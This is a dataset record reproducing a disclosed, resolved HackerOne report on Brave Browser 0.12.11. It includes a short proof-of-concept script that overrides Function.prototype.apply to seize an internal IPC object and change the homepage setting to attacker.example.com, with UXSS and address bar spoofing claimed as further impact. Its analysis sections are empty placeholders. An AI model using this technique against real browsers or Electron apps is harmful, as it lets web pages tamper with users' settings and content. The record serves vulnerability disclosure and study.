@@ -1,0 +1,94 @@
+---
+source: hackerone
+dataset: elamaran619/hackerone_disclosed_reports
+h1_id: '188086'
+original_report_id: '188086'
+title: Sending arbitrary IPC messages via overriding Function.prototype.apply
+weakness: Command Injection - Generic
+team_handle: brave
+created_at: '2016-12-03T21:36:17.831Z'
+disclosed_at: '2018-09-18T18:15:50.065Z'
+has_bounty: true
+visibility: full
+substate: resolved
+vote_count: 52
+tags:
+- hackerone
+- command-injection-generic
+---
+
+# Sending arbitrary IPC messages via overriding Function.prototype.apply
+
+## Metadata
+
+- HackerOne Report ID: 188086
+- Weakness: Command Injection - Generic
+- Program: brave
+- Disclosed At: 2018-09-18T18:15:50.065Z
+- Has Bounty: Yes
+- Visibility: full
+- Substate: resolved
+
+## Original Report
+
+## Summary:
+Brave Browser allows to overwrite the internal js code from the user js code.
+Using this behavior, an attacker can send arbitrary IPC messages and do UXSS, address bar spoofing, changing browser settings and so on. This bug is similar to #187542.
+
+## Tested on: 
+Brave	0.12.11
+
+## Steps To Reproduce:
+1. Go to this page: https://vulnerabledoma.in/brave/settings_change2.html 
+```
+<script>
+Function.prototype.apply=function(ipc){
+    ipc.send("dispatch-action",'{"actionType":"app-change-setting","key":"general.homepage","value":"http://attacker.example.com/"}');
+}
+</script>
+<div style="visibility:hidden">
+<embed src=".swf"></embed>
+</div>
+```
+
+2. See `about:preferences`. You can confirm that your home page is changed to `http://attacker.example.com/`.
+
+Also an attacker can do UXSS and address bar spoofing using this bug. Please see #187542's PoC .
+
+#Technical Details
+
+This `apply` in the `ipc_utils.js` is overwritten: 
+```
+  ipcRenderer.emit = function () {
+    arguments[1].sender = ipcRenderer
+    return EventEmitter.prototype.emit.apply(ipcRenderer, arguments)
+  }
+  atom.v8.setHiddenValue('ipc', ipcRenderer)
+}
+```
+And the 1st arguments leaks IPC method.
+
+Could you confirm this bug?
+Thanks!
+
+## Extracted Security Notes
+
+### Likely Vulnerability Class
+
+*Leave this section for future enrichment.*
+
+### Likely Root Cause
+
+*Leave this section for future enrichment.*
+
+### Potential Impact
+
+*Leave this section for future enrichment.*
+
+### Defensive Test Cases
+
+*Leave this section for future enrichment.*
+
+### Remediation Ideas
+
+*Leave this section for future enrichment.*
